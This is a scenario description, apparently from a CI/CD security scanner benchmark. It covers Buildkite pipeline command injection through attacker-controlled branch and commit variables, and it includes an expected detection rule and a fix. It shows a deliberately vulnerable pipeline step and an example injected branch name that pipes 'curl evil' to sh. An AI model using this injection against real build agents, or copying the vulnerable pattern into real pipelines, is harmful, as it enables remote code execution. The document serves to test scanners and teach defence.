# Scenario 79: Buildkite — `$BUILDKITE_*` command injection

**Provider:** Buildkite · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`.buildkite/pipeline.yml`](.buildkite/pipeline.yml)

## The pattern

```yaml
- command: echo "Building branch $BUILDKITE_BRANCH" && ./build.sh "$BUILDKITE_MESSAGE"
```

Attacker-influenced Buildkite variables (`$BUILDKITE_BRANCH`,
`$BUILDKITE_MESSAGE`, `$BUILDKITE_PULL_REQUEST_*`) used unquoted / interpolated
into a step `command:`.

## How an attacker exploits it

Branch/PR/commit metadata are attacker-controllable; a branch named
`;curl evil|sh` (or a commit message with shell metacharacters) executes on the
agent. Same class as scenarios 56 / 62.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `BK-003` — untrusted Buildkite variable interpolated in command |

> Buildkite is scored by pipeline-check only in this comparison.

## Fix

Don't interpolate `$BUILDKITE_*` SCM metadata into commands; pass values via the
environment and quote them; validate/allow-list branch names.

## References

- Buildkite — Environment variables: https://buildkite.com/docs/pipelines/environment-variables
